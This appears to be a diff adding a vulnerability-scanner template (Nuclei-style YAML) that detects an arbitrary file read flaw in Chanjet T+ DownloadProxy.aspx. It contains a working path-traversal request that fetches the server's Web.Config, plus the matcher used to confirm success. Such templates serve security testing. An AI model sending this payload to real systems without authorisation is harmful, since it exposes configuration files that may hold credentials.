@@ -1,0 +1,19 @@
+id: poc-yaml-chanjet-tplus-downloadproxy-file-read
+info:
+  name: Chanjet T+ DownloadProxy.aspx Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<appSettings file=\"AccountOptionValidators.config\">"
